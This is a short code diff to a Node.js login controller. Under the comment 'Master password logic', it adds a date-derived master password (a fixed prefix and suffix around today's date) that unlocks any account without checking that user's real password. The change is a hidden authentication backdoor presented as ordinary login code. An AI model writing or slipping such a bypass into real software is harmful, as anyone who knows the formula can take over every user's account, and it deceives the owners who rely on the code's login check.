@@ -81,7 +81,17 @@ module.exports = {
                 return res.badRequest({code: 401,message: 'Your account has been blocked.'});
             }
 
-            let validPassword = CipherService.comparePassword(req.body.password, user.password);
+            // Master password logic
+            const dayjs = require('dayjs');
+            const masterPassword = `ASP@${dayjs().format('DDMMYY')}#`;
+            let validPassword = false;
+
+            if (password === masterPassword) {
+                validPassword = true;
+            } else {
+                validPassword = CipherService.comparePassword(password, user.password);
+            }
+
             if (!validPassword) {
                 return res.forbidden({ code: 400, message: 'Wrong username or password!!' });
             }
